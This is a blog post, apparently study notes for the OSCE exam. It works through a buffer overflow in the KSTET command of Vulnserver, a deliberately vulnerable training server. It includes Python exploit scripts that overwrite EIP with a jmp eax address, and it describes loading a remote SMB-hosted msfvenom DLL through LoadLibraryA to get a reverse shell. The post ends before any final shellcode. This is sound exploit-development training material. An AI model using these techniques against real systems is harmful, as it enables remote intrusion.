---
layout: post
title: OSCE Prep - Vulnserver KSTET Using Win32 API 
categories: [OSCE]
---

While preparing for my upcoming OSCE exam I have spent many hours exploiting Vulnserver's various vulnerable functions in different ways. In this post, I wanted to highlight a technique I first came across on a Hack The Box write-up of the BigHead vulnerable machine by mislusnys, which can be found [here](http://mislusnys.github.io/post/htb-bighead/). All credit for this technique goes to them, I am merely using it to exploit a similarly small buffer space without making use of an egghunter or re-using sockets.

The below steps were performed on a Windows Vista 6.0 workstation using OllyDbg.

### Win32 API One-liners

The Win32 API contains various ways of executing commands on the operating system. The most well known ones are `WinExec()`, `System()` and `ShellExecute()`. Each of these can be passed a command to be run directly on the system as if you entered it on the commandline. For a good write-up on `WinExec()` shellcode, I recommend FuzzySecurity's [Writing W32 shellcode](https://www.fuzzysecurity.com/tutorials/expDev/6.html) guide which is part of his excellent exploit development series.

A lesser known but equally effective Win32 API one-liner to execute code is the `LoadLibraryA()` function which is also exported by kernel32.dll. 

### Shhh, is LoadLibrary!

The LoadLibraryA function is used to load a module into the address space of the calling process. According to the [Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya), it only takes one argument:
```c++
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
```

Luckily, the lpLibFileName can be any resolvable path in Windows - including network paths. This effectively allows us to call any DLL on a SMB share and have it loaded by the application. It's then pretty straightforward to craft a DLL of our choosing using msfvenom and capture the reverse shell. Since it only takes one argument, the amount of shellcode required to execute this is quite small, which can be very handy when we're working with limited buffer space. Let's see this in action in the Vulnserver KSTET command. 


### KSTET

I'll skip the fuzzing of the KSTET function in vulnserver as there's plenty of write-ups on this subject already. For the purpose of this post we'll assume we know the offsets for EIP and will use the following skeleton exploit to start:
```python
#!/usr/bin/python

import sys
import socket

buf = "KSTET "
buf += "A"*70
buf += "BBBB"
buf += "C"*(1000-len(buf))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.12",9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()
```

If we run the above script, EIP will be overwritten by our 4 B's. We also notice EAX points to the start of our buffer:
![eax buffer](/images/eax-buffer.png)

We'll replace the B's with a `jmp eax` instruction to land straight into our buffer. We find one in the main vulnserv module (vulnserver.exe) at `0040100C`. We can avoid the null byte by performing a three-byte overwrite of EIP. Our exploit now looks as follows:

```python
#!/usr/bin/python

import sys
import socket

buf = "KSTET "
buf += "A"*70
buf += "\x0C\x10\x40" #eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.12",9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()
```
If we set a breakpoint on `0040100C` and run our exploit, we'll see our EIP overwrite is succesful and we are now directed straight into our buffer:

![successful landing](/images/intothebufferwego.png)

The first instructions we encounter are the 'KSTET ' command, including the space. Lucky for us these are not detrimental to our execution and we can easily step through until we reach our buffer of `A`'s.



